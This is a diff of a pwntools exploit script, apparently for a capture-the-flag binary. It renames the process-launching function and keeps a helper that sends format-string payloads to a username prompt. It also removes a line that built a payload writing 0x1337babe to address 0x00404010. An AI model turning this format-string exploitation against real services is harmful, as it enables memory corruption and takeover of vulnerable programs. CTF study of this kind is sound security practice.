@@ -14,7 +14,7 @@ break *main
 continue
 """
 
-def exploit_process():
+def run():
     if args.REMOTE:
         return remote(remote_addr, remote_port)
     elif args.GDB:
@@ -27,7 +27,7 @@ def exploit_process():
     else:
         return elf.process()
 
-p = exploit_process()
+p = run()
 
 ##### Pwn #####
 p.recvuntil("> ", drop=True)
@@ -45,7 +45,7 @@ payload = flat(
 # Previous recv might impact the fmtstr_payload function (so make sure to add it)
 
 def fmt_exploit(payload):
-    p = exploit_process()
+    p = run()
     p.sendline(b'3')
     p.recvuntil(b'Insert your username to verify it: ')
     p.sendline(payload)
@@ -53,5 +53,4 @@ def fmt_exploit(payload):
     return res
 
 format_string = FmtStr(execute_fmt=fmt_exploit)
-payload = fmtstr_payload(format_string.offset, dict(0x00404010=0x1337babe))
 
